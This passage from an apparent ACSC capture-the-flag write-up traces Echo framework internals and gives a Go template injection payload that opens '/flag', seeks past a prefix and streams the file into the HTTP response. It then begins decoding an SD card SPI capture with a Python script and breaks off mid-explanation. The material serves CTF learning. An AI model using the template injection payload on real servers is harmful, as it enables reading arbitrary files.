</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">type</span> <span class="nx">FS</span> <span class="kd">interface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Open opens the named file.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// When Open returns an error, it should be of type *PathError
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// with the Op field set to &#34;open&#34;, the Path field set to name,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// and the Err field describing the problem.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Open should reject attempts to open names that do not satisfy
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// ValidPath(name), returning a *PathError with Err set to
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// ErrInvalid or ErrNotExist.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">Open</span><span class="p">(</span><span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">File</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Located in echo/echo_fs.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">filesystem</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Filesystem is file system used by Static and File handlers to access files.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Defaults to os.DirFS(&#34;.&#34;)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// When dealing with `embed.FS` use `fs := echo.MustSubFS(fs, &#34;rootDirectory&#34;) to create sub fs which uses necessary
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// prefix for directory path. This is necessary as `//go:embed assets/images` embeds files with paths
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// including `assets/images` as their prefix.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">Filesystem</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">FS</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">createFilesystem</span><span class="p">()</span> <span class="nx">filesystem</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">filesystem</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Filesystem</span><span class="p">:</span> <span class="nf">newDefaultFS</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// defaultFS exists to preserve pre v4.7.0 behaviour where files were open by `os.Open`.
</span></span></span><span class="line"><span class="cl"><span class="c1">// v4.7 introduced `echo.Filesystem` field which is Go1.16+ `fs.Fs` interface.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Difference between `os.Open` and `fs.Open` is that FS does not allow opening path that start with `.`, `..` or `/`
</span></span></span><span class="line"><span class="cl"><span class="c1">// etc. For example previously you could have `../images` in your application but `fs := os.DirFS(&#34;./&#34;)` would not
</span></span></span><span class="line"><span class="cl"><span class="c1">// allow you to use `fs.Open(&#34;../images&#34;)` and this would break all old applications that rely on being able to
</span></span></span><span class="line"><span class="cl"><span class="c1">// traverse up from current executable run path.
</span></span></span><span class="line"><span class="cl"><span class="c1">// NB: private because you really should use fs.FS implementation instances
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">type</span> <span class="nx">defaultFS</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">prefix</span> <span class="kt">string</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fs</span>     <span class="nx">fs</span><span class="p">.</span><span class="nx">FS</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">newDefaultFS</span><span class="p">()</span> <span class="o">*</span><span class="nx">defaultFS</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">dir</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getwd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">defaultFS</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">prefix</span><span class="p">:</span> <span class="nx">dir</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fs</span><span class="p">:</span>     <span class="kc">nil</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">fs</span> <span class="nx">defaultFS</span><span class="p">)</span> <span class="nf">Open</span><span class="p">(</span><span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">File</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">fs</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">fs</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Located in os/file.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Open opens the named file for reading. If successful, methods on
</span></span></span><span class="line"><span class="cl"><span class="c1">// the returned file can be used for reading; the associated file
</span></span></span><span class="line"><span class="cl"><span class="c1">// descriptor has mode O_RDONLY.
</span></span></span><span class="line"><span class="cl"><span class="c1">// If there is an error, it will be of type *PathError.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="nf">Open</span><span class="p">(</span><span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">File</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">OpenFile</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Located in os/types.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="c1">// File represents an open file descriptor.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">type</span> <span class="nx">File</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="nx">file</span> <span class="c1">// os specific
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Located in os/file.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Seek sets the offset for the next Read or Write on file to offset, interpreted
</span></span></span><span class="line"><span class="cl"><span class="c1">// according to whence: 0 means relative to the origin of the file, 1 means
</span></span></span><span class="line"><span class="cl"><span class="c1">// relative to the current offset, and 2 means relative to the end.
</span></span></span><span class="line"><span class="cl"><span class="c1">// It returns the new offset and an error, if any.
</span></span></span><span class="line"><span class="cl"><span class="c1">// The behavior of Seek on a file opened with O_APPEND is not specified.
</span></span></span><span class="line"><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1">// If f is a directory, the behavior of Seek varies by operating
</span></span></span><span class="line"><span class="cl"><span class="c1">// system; you can seek to the beginning of the directory on Unix-like
</span></span></span><span class="line"><span class="cl"><span class="c1">// operating systems, but not on Windows.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">f</span> <span class="o">*</span><span class="nx">File</span><span class="p">)</span> <span class="nf">Seek</span><span class="p">(</span><span class="nx">offset</span> <span class="kt">int64</span><span class="p">,</span> <span class="nx">whence</span> <span class="kt">int</span><span class="p">)</span> <span class="p">(</span><span class="nx">ret</span> <span class="kt">int64</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">checkValid</span><span class="p">(</span><span class="s">&#34;seek&#34;</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">err</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">,</span> <span class="nx">e</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="nx">offset</span><span class="p">,</span> <span class="nx">whence</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">e</span> <span class="o">==</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">dirinfo</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="nx">r</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">e</span> <span class="p">=</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">EISDIR</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">e</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">wrapErr</span><span class="p">(</span><span class="s">&#34;seek&#34;</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">r</span><span class="p">,</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Interesting, based on those code that I explore:</p>
<ul>
<li><code>Echo</code> has <code>Filesystem</code> field:
<ul>
<li>Which is an interface of <code>fs.FS</code></li>
<li>Which is initialized by <code>createFilesystem</code></li>
</ul>
</li>
<li>Interface <code>fs.FS</code> has <code>Open</code> method</li>
<li>The underlying struct that is passed to <code>Echo.Filesystem</code> during initialization is actually <code>defaultFS</code>.
<ul>
<li>Reading through the <code>Open</code> implementation, calling <code>Echo.Filesystem.Open</code> will actually trigger <code>os.Open</code> and return <code>os.File</code></li>
<li>Why is it <code>os.Open</code>? Because during calling the <code>newDefaultFS()</code>, the <code>fs</code> field was set to nil.</li>
</ul>
</li>
<li><code>os.File</code> has <code>Seek</code> method which can be used to adjust <code>Read</code> pointer.</li>
</ul>
<p>Based on those exploration, a path to skip the <code>ACSC</code> before actually read the file can be seen. The chain that I can think of to do that is:</p>
<ul>
<li>Call <code>.Echo.Filesystem.Open &quot;/flag&quot;</code>, and then we will open a file and return an <code>os.File</code> struct.</li>
<li>Call <code>Seek(4, 0)</code> on the returned <code>File</code>. This will shift the file pointer and skip the <code>ACSC</code> part.</li>
</ul>
<p>At this point, we have successfully seek the opened file. Now, the remaining part is how to return the opened file to the response. Exploring the <code>echo.Context</code> struct again, I found an interesting method</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Located in echo/context.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">context</span><span class="p">)</span> <span class="nf">Stream</span><span class="p">(</span><span class="nx">code</span> <span class="kt">int</span><span class="p">,</span> <span class="nx">contentType</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">r</span> <span class="nx">io</span><span class="p">.</span><span class="nx">Reader</span><span class="p">)</span> <span class="p">(</span><span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">c</span><span class="p">.</span><span class="nf">writeContentType</span><span class="p">(</span><span class="nx">contentType</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">c</span><span class="p">.</span><span class="nx">response</span><span class="p">.</span><span class="nf">WriteHeader</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">io</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">response</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Located in io/io/go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Reader</span> <span class="kd">interface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">Read</span><span class="p">(</span><span class="nx">p</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>By calling <code>.Stream</code> and pass the opened file, the opened file content will be copied and written to the response. We can pass an opened <code>File</code> because it implements <code>Reader</code> interface (due to <code>File</code> has implemented <code>Read</code> method)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// Located in os/file.go
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Read reads up to len(b) bytes from the File and stores them in b.
</span></span></span><span class="line"><span class="cl"><span class="c1">// It returns the number of bytes read and any error encountered.
</span></span></span><span class="line"><span class="cl"><span class="c1">// At end of file, Read returns 0, io.EOF.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">f</span> <span class="o">*</span><span class="nx">File</span><span class="p">)</span> <span class="nf">Read</span><span class="p">(</span><span class="nx">b</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="nx">n</span> <span class="kt">int</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">checkValid</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">err</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">n</span><span class="p">,</span> <span class="nx">e</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">wrapErr</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we know how to return it in our response, below is the full payload that I used</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ $f :=  .Echo.Filesystem.Open &#34;/flag&#34; }} {{ $f.Seek 4 0 }} {{ .Stream 200 &#34;text/html&#34; $f }}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/doZ7ATE.png"
        data-srcset="https://i.imgur.com/doZ7ATE.png, https://i.imgur.com/doZ7ATE.png 1.5x, https://i.imgur.com/doZ7ATE.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/doZ7ATE.png"
        title="https://i.imgur.com/doZ7ATE.png" /></p>
<p>We got the flag!</p>
<blockquote>
<p><strong>Flag: ACSC{h0w_did_y0u_leak_me}</strong></p>
</blockquote>
<h1 id="hardware">Hardware</h1>
<h2 id="hardware-is-not-so-hard-100-pts">Hardware is not so hard (100 pts)</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Quote<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">I have captured communication between a SD card and an embedded device. Could you extract the content of the SD Card? It&rsquo;s in SPI mode.</div>
        </div>
    </div>
<h3 id="initial-analysis-2">Initial Analysis</h3>
<p>On this challenge, we were given a file <code>spi.txt</code> which contents are like below (redacted because it&rsquo;s too long):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Device to SD Card : 400000000095
</span></span><span class="line"><span class="cl">SD Card to Device : 01
</span></span><span class="line"><span class="cl">Device to SD Card : 48000001aa87
</span></span><span class="line"><span class="cl">SD Card to Device : 01000001aa
</span></span><span class="line"><span class="cl">Device to SD Card : 770000000065
</span></span><span class="line"><span class="cl">SD Card to Device : 01
</span></span><span class="line"><span class="cl">Device to SD Card : 694000000077
</span></span><span class="line"><span class="cl">SD Card to Device : 01
</span></span><span class="line"><span class="cl">Device to SD Card : 770000000065
</span></span><span class="line"><span class="cl">SD Card to Device : 01
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">Device to SD Card : 510000003eff
</span></span><span class="line"><span class="cl">SD Card to Device : 00
</span></span><span class="line"><span class="cl">SD Card to Device : fffffffffffffffffffffffffe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
</span></span><span class="line"><span class="cl">Device to SD Card : 5100000029b3
</span></span><span class="line"><span class="cl">SD Card to Device : 00
</span></span><span class="line"><span class="cl">SD Card to Device : fffffffffffffffffffffffffe967bc2730f9a529597a525331c365782c5e1dccf09f2ec8420d931aec4cb62699016b47584ef13b0becb9a64669f2bc162eb84e274b706afc54c702243074898db42bb188688fd0a753e56a1b63b691d83d085de4b97a16af7a1a6266f8ba9887a43ce50b8fc44d833da84d28d4ea3d2fa5f392327a1a1f1385e037c4e3d8c5f0742a85c10272d523d38d34b1912187d6da26e3968cbe0beea7e53d161710a51646ba1fe46ad8858f818b0c5d2c7c4a51b24f05efa975317436275f894621088d05cae1a3136e21387d4fa91c314aaf0d5784f11270b24ee69df10641a13423b09d3827c38c55ea30416ca2d8e94a8f45f65768f7c264253c04b3e1be18904cc1254dbb3050a387574512a1e305c0eec7773e1427c37c41ed5162c8813a6728991ae98345599d1985269fd96d23fb1fd0a737bcf151db45b82d8bc9a54544107f63fb1fd0fe9e34c98620da2e68bbf918d1190825dbc2727076d957627fe9506d968796895a17e263d18641b7d1968af44b46087f41755e613b7af46488ca2b8422fd3060c15157e14a28a29a22a24bd981bd784d264445e15e213befe82ff000c99b070acbde62a4cc53146cfd8d0760efb1a74d3c18a257d11fe0aefd85a88f47fb3fd9af10842108421084e5a1ec7628c096448beb418dde281cd90f01796355f12f86c6427895e1bd75b29595c94bd11611f844d1a6871e8aba2ac836af01649
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the problem&rsquo;s statement, we could deduce that this is the SPI interaction of SD Card. So, I decided to read the specification of SD Card SPI. After googling for a while, I found two good links which is enough to solve this challenge:</p>
<ul>
<li><a href="http://chlazza.nfshost.com/sdcardinfo.html" target="_blank" rel="noopener noreffer ">http://chlazza.nfshost.com/sdcardinfo.html</a></li>
<li><a href="http://www.rjhcoding.com/avrc-sd-interface-4.php" target="_blank" rel="noopener noreffer ">http://www.rjhcoding.com/avrc-sd-interface-4.php</a></li>
</ul>
<p>So, the first website explain the SD Card SPI Data Transfer Protocol. Basically, the command token format is always 6 bytes, where the specification is:</p>
<img src ="https://i.imgur.com/pdmPlTp.png">
<p>Based on those spec, let&rsquo;s create a simple script to extract the command and argument from the given <code>spi.txt</code>. Below is the script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;spi.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Device to SD Card : &#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">full_cmd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Device to SD Card : &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)[</span><span class="mi">2</span><span class="p">:][</span><span class="mi">47</span><span class="o">-</span><span class="mi">45</span><span class="p">:</span><span class="mi">47</span><span class="o">-</span><span class="mi">40</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Based on the protocol specification</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)[</span><span class="mi">2</span><span class="p">:][</span><span class="mi">47</span><span class="o">-</span><span class="mi">39</span><span class="p">:</span><span class="mi">47</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Based on the protocol specification</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;CMD: </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s1"> | ARG: </span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the result (redacted because it&rsquo;s too long)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CMD: 0 | ARG: 0
</span></span><span class="line"><span class="cl">CMD: 8 | ARG: 426
</span></span><span class="line"><span class="cl">CMD: 23 | ARG: 0
</span></span><span class="line"><span class="cl">CMD: 9 | ARG: 1073741824
</span></span><span class="line"><span class="cl">CMD: 23 | ARG: 0
</span></span><span class="line"><span class="cl">CMD: 9 | ARG: 1073741824
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 0
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 20
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 54
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 16
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 14
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 55
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 21
</span></span><span class="line"><span class="cl">CMD: 17 | ARG: 3
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>I notice that there are a lot of <code>CMD17</code> commands and each of them has different arg values. Reading through the specification in the second link, it turns out that:</p>
<ul>
<li><code>CMD17</code> is a command to read data from the SD Card per block.</li>
<li>The default block length is 512 bytes.</li>
<li>The argument represent the block position.</li>
</ul>
